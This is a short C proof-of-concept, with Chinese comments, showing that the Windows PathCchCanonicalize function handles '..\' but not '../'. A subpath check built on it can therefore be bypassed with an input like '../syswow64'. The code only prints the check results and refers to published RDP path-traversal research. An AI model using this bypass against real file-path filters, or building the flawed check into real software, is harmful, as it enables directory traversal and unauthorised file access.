/*
tested on windows 10 x64 19042.685 Release

PathCchCanonicalize POC

大致原理:
    PathCchCanonicalize 规范子路径时 未匹配 / 只匹配了 \

预期效果:
    导致部分使用 PathCchCanonicalize 的过滤被绕过

refer: https://research.checkpoint.com/2020/reverse-rdp-the-path-not-taken/

*/

#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <pathcch.h>

#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "shlwapi.lib")

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

BOOL IsCanonicalSubpath(LPCWSTR pszFile) {
    // 判断是否是规范子路径
    if (!PathIsRelative(pszFile)) {
        return FALSE;
    }

    WCHAR szConcat[MAX_PATH] = { 0 };
    if (!SUCCEEDED(StringCchCat(szConcat, MAX_PATH, L"C:\\Windows\\system32\\"))) {
        return FALSE;
    }

    if (!SUCCEEDED(StringCchCat(szConcat, MAX_PATH, pszFile))) {
        return FALSE;
    }

    WCHAR szCanonical[MAX_PATH] = { 0 };
    if (!SUCCEEDED(PathCchCanonicalize(szCanonical, MAX_PATH, szConcat))) {
        return FALSE;
    }
    printf("szConcat: %ls\n", szConcat);
    printf("szCanonical: %ls\n", szCanonical);
    return lstrcmpW(szCanonical, szConcat) == 0;
}

int main()
{
    init();
    printf("res: %d\n", IsCanonicalSubpath(L"..\\syswow64"));
    printf("res: %d\n", IsCanonicalSubpath(L"../syswow64"));
    return 0;
}
